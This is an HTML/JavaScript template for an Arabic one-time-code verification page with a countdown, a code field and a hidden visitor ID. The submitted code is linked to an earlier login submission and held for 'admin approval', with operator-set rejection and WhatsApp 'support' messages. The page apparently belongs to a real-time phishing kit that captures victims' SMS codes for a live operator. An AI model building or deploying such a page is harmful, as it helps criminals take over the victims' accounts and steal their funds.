<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>صفحة التوثيق</title>
  <style>
    @font-face {
      font-family: "Cairo";
      src: url("{{ url_for('static', path='frontend/fonts/cairo/Cairo-Regular.ttf') }}") format("truetype");
      font-weight: 400;
      font-style: normal;
    }

    @font-face {
      font-family: "Cairo";
      src: url("{{ url_for('static', path='frontend/fonts/cairo/Cairo-SemiBold.ttf') }}") format("truetype");
      font-weight: 600;
      font-style: normal;
    }

    @font-face {
      font-family: "Cairo";
      src: url("{{ url_for('static', path='frontend/fonts/cairo/Cairo-Bold.ttf') }}") format("truetype");
      font-weight: 700;
      font-style: normal;
    }

    :root {
      --bg: #ffffff;
      --ink: #676f80;
      --title: #576174;
      --orange: #f08f81;
      --line: #e4e4e4;
      --action: #f09e8e;
      --disabled: #dfdfda;
      --btn-text: #f8f8f8;
      --topbar-height: clamp(50px, 8dvh, 58px);
    }

    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      min-height: 100%;
      height: 100%;
      background: var(--bg);
      font-family: "Cairo", sans-serif;
      color: var(--ink);
      overflow: hidden;
    }

    body {
      min-height: 100dvh;
      display: flex;
      flex-direction: column;
    }

    .app-topbar {
      width: 100%;
      background: #000000;
      position: relative;
      z-index: 10;
      border-bottom: 1px solid rgba(255, 255, 255, 0.14);
      flex-shrink: 0;
    }

    .app-topbar::after {
      content: "";
      position: absolute;
      right: 0;
      left: 0;
      bottom: -8px;
      height: 8px;
      background: linear-gradient(180deg, rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0));
      pointer-events: none;
    }

    .page {
      width: 100%;
      min-height: 0;
      height: auto;
      flex: 1 1 auto;
      max-width: 430px;
      margin: 0 auto;
      background: #fff;
      display: flex;
      flex-direction: column;
      box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.02);
      overflow: hidden;
    }

    .topbar {
      min-height: var(--topbar-height);
      color: #e2e6ef;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      font-weight: 600;
      letter-spacing: 0.2px;
    }

    .topbar-title {
      font-size: clamp(1.02rem, 3.8vw, 1.2rem);
      line-height: 1.2;
    }

    .topbar-back {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      border: 0;
      background: transparent;
      color: #d7dce7;
      font-size: clamp(1.2rem, 5vw, 1.45rem);
      line-height: 1;
      cursor: pointer;
      padding: 4px;
    }

    .content {
      flex: 1;
      padding: clamp(16px, 4dvh, 24px) 20px 12px;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }

    .heading {
      margin: 0 0 16px;
      font-size: clamp(1.35rem, 5.8vw, 1.8rem);
      line-height: 1.2;
      color: var(--title);
      font-weight: 700;
    }

    .subtitle {
      margin: 0;
      font-size: clamp(0.92rem, 3.8vw, 1.1rem);
      color: #8a8f98;
      font-weight: 600;
      line-height: 1.45;
    }

    .mobile-number {
      margin: 10px 0 18px;
      color: #ff6e00;
      font-size: clamp(1.08rem, 4.9vw, 1.35rem);
      letter-spacing: 0.4px;
      font-weight: 700;
      direction: ltr;
    }

    .not-your-number {
      margin: 0;
      border: 0;
      background: transparent;
      color: #8e8e8e;
      text-decoration: underline;
      text-underline-offset: 5px;
      font-size: clamp(0.84rem, 3.3vw, 0.95rem);
      cursor: pointer;
      font-family: inherit;
    }

    .otp-label {
      margin: clamp(26px, 5.6dvh, 42px) 0 10px;
      font-size: clamp(0.86rem, 3.5vw, 1rem);
      color: #8e8e8e;
      font-weight: 600;
      align-self: center;
      text-align: center;
      padding-inline: 0;
    }

    .otp-input {
      width: 100%;
      height: clamp(54px, 9dvh, 68px);
      border: 1.5px solid var(--line);
      border-radius: 11px;
      background: #fff;
      color: #404855;
      font: inherit;
      font-size: clamp(1rem, 4.8vw, 1.25rem);
      text-align: center;
      letter-spacing: clamp(6px, 2.3vw, 9px);
      direction: ltr;
      outline: none;
      padding-inline: 12px;
    }

    .otp-input:focus {
      border-color: #d5d5d5;
      box-shadow: 0 0 0 2px rgba(230, 230, 230, 0.55);
    }

    .resend {
      margin-top: clamp(22px, 4.5dvh, 32px);
      border: 0;
      background: transparent;
      color: #a3a3a3;
      font: inherit;
      font-size: clamp(0.84rem, 3.3vw, 0.95rem);
      text-decoration: none;
      cursor: default;
      pointer-events: none;
      font-weight: 600;
    }

    .resend.is-ready {
      color: #ff6e00;
      text-decoration: underline;
      text-underline-offset: 4px;
      cursor: pointer;
      pointer-events: auto;
    }

    .bottom-action {
      margin-top: auto;
      padding: 12px 12px 14px;
      background: #ffffff;
    }

    .verify-btn {
      width: 100%;
      min-height: clamp(50px, 8dvh, 58px);
      border: 0;
      border-radius: 8px;
      background: var(--disabled);
      color: var(--btn-text);
      font-family: inherit;
      font-size: clamp(1.08rem, 4.3vw, 1.3rem);
      font-weight: 700;
      cursor: not-allowed;
    }

    .verify-btn:not(:disabled) {
      background: #ff6e00;
      cursor: pointer;
    }

    body.is-global-submitting,
    body.is-error-modal-open,
    body.is-support-modal-open {
      overflow: hidden;
    }

    .global-submit-overlay,
    .reject-error-modal,
    .support-info-modal {
      position: fixed;
      inset: 0;
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 22px;
      background: rgba(17, 17, 17, 0.6);
      backdrop-filter: blur(3px);
    }

    .global-submit-overlay[hidden],
    .reject-error-modal[hidden],
    .support-info-modal[hidden] {
      display: none !important;
    }

    .global-submit-overlay-card,
    .reject-error-modal-card,
    .support-info-modal-card {
      width: min(100%, 420px);
      background: #ffffff;
      border-radius: 22px;
      box-shadow: 0 24px 58px rgba(0, 0, 0, 0.22);
      padding: 24px 22px;
      text-align: center;
    }

    .global-submit-overlay-card {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
    }

    .global-submit-spinner {
      width: 42px;
      height: 42px;
      border-radius: 999px;
      border: 4px solid rgba(255, 110, 0, 0.18);
      border-top-color: #ff6e00;
      animation: global-spin 0.85s linear infinite;
    }

    .global-submit-text,
    .reject-error-message,
    .support-info-message {
      margin: 0;
      color: #566173;
      font-size: 0.93rem;
      line-height: 1.8;
      font-weight: 600;
    }

    .reject-error-modal-body,
    .support-info-modal-body {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    .reject-error-icon {
      width: 84px;
      height: 84px;
      object-fit: contain;
    }

    .reject-error-close-btn,
    .support-info-contact-btn {
      width: 100%;
      min-height: 52px;
      border-radius: 12px;
      border: 0;
      font: inherit;
      font-size: 0.96rem;
      font-weight: 700;
      cursor: pointer;
    }

    .reject-error-close-btn {
      margin-top: 18px;
      background: #eceff4;
      color: #526072;
    }

    .support-info-actions {
      margin-top: 18px;
      display: flex;
    }

    .support-info-contact-btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      background: transparent;
      color: #4b5563;
      border: 2px solid #d63f3f;
      box-shadow: none;
    }

    .support-info-contact-icon {
      display: inline-flex;
      width: 22px;
      height: 22px;
      line-height: 0;
      color: #25d366;
    }

    .support-info-contact-icon svg {
      width: 100%;
      height: 100%;
    }

    .support-info-dismiss-btn {
      position: absolute;
      top: 12px;
      right: 12px;
      width: 34px;
      height: 34px;
      border: 0;
      border-radius: 999px;
      background: #f2f4f8;
      color: #7b8797;
      font: inherit;
      font-size: 1.4rem;
      line-height: 1;
      cursor: pointer;
    }

    .support-info-modal-card {
      position: relative;
      padding-top: 48px;
    }

    .approval-status {
      margin: 12px 0 0;
      min-height: 1.3em;
      color: #8b93a1;
      font-size: 0.88rem;
      line-height: 1.5;
    }

    .approval-status.is-hidden {
      visibility: hidden;
    }

    .approval-status.is-error {
      color: #d63939;
    }

    @keyframes global-spin {
      from {
        transform: rotate(0deg);
      }
      to {
        transform: rotate(360deg);
      }
    }

    @media (max-height: 740px) {
      .content {
        padding-top: 14px;
        padding-bottom: 10px;
      }

      .otp-label {
        margin-top: 20px;
      }

      .resend {
        margin-top: 16px;
      }
    }
  </style>
</head>
<body
  data-heartbeat-interval-ms="{{ heartbeat_interval_seconds * 1000 }}"
  data-support-whatsapp-number="{{ support_whatsapp_number }}"
  data-support-whatsapp-url="{{ support_whatsapp_url }}"
  data-support-approval-message="{{ support_approval_message }}"
  data-otp-rejection-message="{{ otp_rejection_message }}"
>
  <header class="app-topbar">
    <div class="topbar">
      <button class="topbar-back" type="button" aria-label="الرجوع">‹</button>
      <span class="topbar-title">التحقق من الأمن</span>
    </div>
  </header>

  <div class="page">

    <form
      class="content"
      id="verification-form"
      data-mongo-form
      data-form-name="verification-code"
      data-submit-validate="validateVerificationForm"
      data-page-path="/verification"
      data-await-admin-approval="true"
    >
      <input id="visitor_id" name="visitor_id" type="hidden">
      <input id="verification-phone-hidden" name="phone_number" type="hidden">
      <input id="verification-login-submission-hidden" name="login_submission_id" type="hidden">
      <h1 class="heading">التحقق من رقم الموبايل</h1>
      <p class="subtitle">تم إرسال رمز التحقق عبر الرسائل القصيرة إلى:</p>
      <p class="mobile-number" id="verification-phone">07XXXXXXXX</p>
      <button class="not-your-number" id="not-your-number-action" type="button">ليس رقمك؟</button>

      <label class="otp-label" for="otp-input">ادخل رمز التحقق المكون من 6 أرقام:</label>
      <input
        id="otp-input"
        class="otp-input"
        type="text"
        name="otp"
        inputmode="numeric"
        autocomplete="one-time-code"
        maxlength="6"
        minlength="6"
        required
        aria-label="رمز التحقق"
      >

      <button class="resend" id="resend-action" type="button" disabled aria-disabled="true">01:00</button>
    </form>

    <footer class="bottom-action">
      <button id="verify-btn" class="verify-btn" type="submit" form="verification-form" disabled>التحقق</button>
    </footer>
  </div>

  <script src="{{ url_for('static', path='frontend/js/main.js') }}?v=20260315-2"></script>
  <script>
    (function () {
      "use strict";

      var input = document.getElementById("otp-input");
      var verifyButton = document.getElementById("verify-btn");
      var verificationForm = document.getElementById("verification-form");
      var backButton = document.querySelector(".topbar-back");
      var phoneDisplay = document.getElementById("verification-phone");
      var resendAction = document.getElementById("resend-action");
      var notYourNumberAction = document.getElementById("not-your-number-action");
      var hiddenPhoneInput = document.getElementById("verification-phone-hidden");
      var hiddenLoginSubmissionInput = document.getElementById("verification-login-submission-hidden");
      var PHONE_STORAGE_KEY = "fastapi-base-last-phone-number";
      var LOGIN_SUBMISSION_STORAGE_KEY = "fastapi-base-login-submission-id";
      var OBJECT_ID_REGEX = /^[a-f0-9]{24}$/i;

      if (backButton) {
        backButton.addEventListener("click", function () {
          if (window.history.length > 1) {
            window.history.back();
            return;
          }
          window.location.assign("/");
        });
      }

      function getStoredPhoneNumber() {
        try {
          var value = localStorage.getItem(PHONE_STORAGE_KEY) || "";
          if (/^07[789]\d{7}$/.test(value)) {
            return value;
          }
        } catch (error) {
        }
        return "";
      }

      function syncDisplayedPhoneNumber() {
        if (!phoneDisplay) {
          return;
        }
        var storedPhone = getStoredPhoneNumber();
        if (storedPhone) {
          phoneDisplay.textContent = storedPhone;
          if (hiddenPhoneInput) {
            hiddenPhoneInput.value = storedPhone;
          }
          return;
        }
        if (hiddenPhoneInput) {
          hiddenPhoneInput.value = "";
        }
      }

      function isObjectId(value) {
        return typeof value === "string" && OBJECT_ID_REGEX.test(value);
      }

      function getLoginSubmissionIdFromQuery() {
        try {
          var params = new URLSearchParams(window.location.search);
          var candidate = String(params.get("login_submission_id") || "").trim();
          if (isObjectId(candidate)) {
            return candidate;
          }
        } catch (error) {
        }
        return "";
      }

      function getStoredLoginSubmissionId() {
        try {
          var existing = String(localStorage.getItem(LOGIN_SUBMISSION_STORAGE_KEY) || "").trim();
          if (isObjectId(existing)) {
            return existing;
          }
          if (existing) {
            localStorage.removeItem(LOGIN_SUBMISSION_STORAGE_KEY);
          }
        } catch (error) {
        }
        return "";
      }

      function syncLinkedLoginSubmissionId() {
        if (!hiddenLoginSubmissionInput) {
          return;
        }
        var linkedSubmissionId = getLoginSubmissionIdFromQuery() || getStoredLoginSubmissionId();
        hiddenLoginSubmissionInput.value = linkedSubmissionId || "";
      }

      function formatSeconds(totalSeconds) {
        var minutes = Math.floor(totalSeconds / 60);
        var seconds = totalSeconds % 60;
        return String(minutes).padStart(2, "0") + ":" + String(seconds).padStart(2, "0");
      }

      function startResendCountdown() {
        if (!resendAction) {
          return;
        }
        var remaining = 60;
        resendAction.textContent = formatSeconds(remaining);
        resendAction.disabled = true;
        resendAction.setAttribute("aria-disabled", "true");
        resendAction.classList.remove("is-ready");

        var timerId = window.setInterval(function () {
          remaining -= 1;
          if (remaining > 0) {
            resendAction.textContent = formatSeconds(remaining);
            return;
          }
          window.clearInterval(timerId);
          resendAction.textContent = "أعد إرسال الرمز";
          resendAction.disabled = false;
          resendAction.setAttribute("aria-disabled", "false");
          resendAction.classList.add("is-ready");
        }, 1000);
      }

      if (resendAction) {
        resendAction.addEventListener("click", function () {
          if (resendAction.disabled) {
            return;
          }
          startResendCountdown();
        });
      }

      if (notYourNumberAction) {
        notYourNumberAction.addEventListener("click", function () {
          window.location.assign("/");
        });
      }

      if (!input || !verifyButton) {
        syncDisplayedPhoneNumber();
        startResendCountdown();
        return;
      }

      function normalizeDigits(value) {
        return value
          .replace(/[\u0660-\u0669]/g, function (char) { return String(char.charCodeAt(0) - 1632); })
          .replace(/[\u06F0-\u06F9]/g, function (char) { return String(char.charCodeAt(0) - 1776); })
          .replace(/[^\d]/g, "")
          .slice(0, 6);
      }

      function syncButtonState() {
        verifyButton.disabled = input.value.length !== 6;
      }

      input.addEventListener("input", function () {
        input.value = normalizeDigits(input.value);
        syncButtonState();
      });

      window.validateVerificationForm = function () {
        var normalized = normalizeDigits(input.value);
        input.value = normalized;
        if (normalized.length !== 6) {
          syncButtonState();
          input.focus();
          return false;
        }
        syncDisplayedPhoneNumber();
        syncLinkedLoginSubmissionId();
        return true;
      };

      if (verificationForm) {
        verificationForm.addEventListener("submit", function () {
          syncDisplayedPhoneNumber();
          syncLinkedLoginSubmissionId();
        });
      }

      syncDisplayedPhoneNumber();
      syncLinkedLoginSubmissionId();
      startResendCountdown();
      syncButtonState();
    })();
  </script>
</body>
</html>
